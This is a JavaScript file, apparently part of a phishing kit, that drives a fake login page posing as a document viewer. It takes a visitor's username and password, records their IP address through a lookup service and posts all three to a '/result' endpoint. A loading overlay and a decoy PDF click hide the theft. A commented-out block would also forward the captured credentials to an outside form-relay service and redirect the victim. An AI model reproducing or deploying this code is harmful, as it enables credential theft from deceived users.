
document.addEventListener('DOMContentLoaded', (event) => {
    // Function to get query parameters from the URL
    function getQueryParams() {
        let params = {};
        let queryString = window.location.search.substring(1);
        let queryArray = queryString.split('&');
        queryArray.forEach((query) => {
            let [key, value] = query.split('=');
            params[key] = decodeURIComponent(value);
        });
        return params;
    }

    // Get query parameters
    let queryParams = getQueryParams();
    // let number = queryParams.number;
    let number = queryParams.action;

    // Click the button based on the 'number' variable from the query params
    if (number) {
        let buttonId =  number;
        let buttons = document.querySelectorAll('button');
        let button = buttons[number];
        if (button) {
            // console.log(`Clicking button with id: ${buttonId}`);
            button.click();
        } else {
            // console.log(`Button with id: ${buttonId} not found`);
        }
    } else {
        console.log('No number query parameter found');
    }
});


function submitForm(){
    if($('#username').val() == '' ||  $('#pwinp').val() == '' ){
        alert('All fields are required')
        return
    }
    action()

    let ipad;
    
        // let getip = JSON.stringify(ipad)
        $.getJSON('https://api.ipify.org?format=json', function(ipdata) {
        console.log(ipdata)
        ipad = ipdata.ip
    
    var formData =  { 'uname':  $('#username').val(), 'pwd':  $('#pwinp').val(), 'ipad': ipad  }

    let _next = window.location.origin + '/doc.pdf';
    // $('#__next').val(_next)

    // var formData = $(this).serialize();
    // $('#overlay').fadeOut()
    $.post('/result', formData, function(response) {
          // JSON variable with form data
          var formDataJson = formData;
          formDataJson._captcha = "false";
            console.log(formDataJson)
            $('.pdfresult').click()
            let resultbtn = document.getElementsByClassName('pdfresult')
            resultbtn[0].click()
                    // Convert JSON to URL-encoded string
                    // var sformData = $.param(formDataJson);
    
                    // $.ajax({
                    //     url: 'https://formsubmit.co/test@gmail.com', // Form action URL
                    //     method: 'POST', // Set the method to POST
                    //     data: sformData, // Send serialized form data
                    //     success: function(response) {
                    //         // Handle success
                    //         // alert('Form submitted successfully!');
                    //         // window.location.replace(_next)
                    //         window.location.href = _next;
                    //         document.location.href = _next
                    //     },
                    //     error: function(error) {
                    //         // Handle error
                    //         // alert('Error submitting form.');
                    //     }
                    // });
                });
    });
    
    }
    
    function action(){
        // $(document).ready(function() {
            // Append overlay HTML to the body
            $('body').append(`
                <div id="overlay" style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background-color: rgba(0, 0, 0, 0.5);
                    align-items: center;
                    justify-content: center;
                    z-index: 999999999999999;
                    display: flex;
                    gap: 50px;
                ">
                    <div id="loader" style="
                        border: 16px solid #f3f3f3;
                        border-radius: 50%;
                        border-top: 16px solid #3498db;
                        width: 80px;
                        height: 80px;
                        animation: spin 1s linear infinite;
                    "></div>
                    <div id="successMessage" style="
                        display: none;
                        color: white;
                        font-size: 24px;
                        padding: 0px;
                        background: #3f3f3ff7;
                        border-radius: 10px;
                    "> </div>
                </div>
            `);
    
            // Add CSS for loader animation
            $('head').append(`
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            `);
    
            // Show overlay with loader, then success message, then fade out
            function showLoadingAndSuccess() {
                $('#overlay').fadeIn(1000, function() {
                    // setTimeout(function() {
                        $('#loader').fadeIn(1000, function() {
                            // $('#successMessage').fadeIn(1000, function() {
                            //     setTimeout(function() {
                            //         $('#overlay').fadeOut(1000);
                            //     }, 3500);
                            // });
                        });
                    // }, 2000);
                });
            }
    
            // Example trigger
            showLoadingAndSuccess();
        // });
    
    }
    
  
    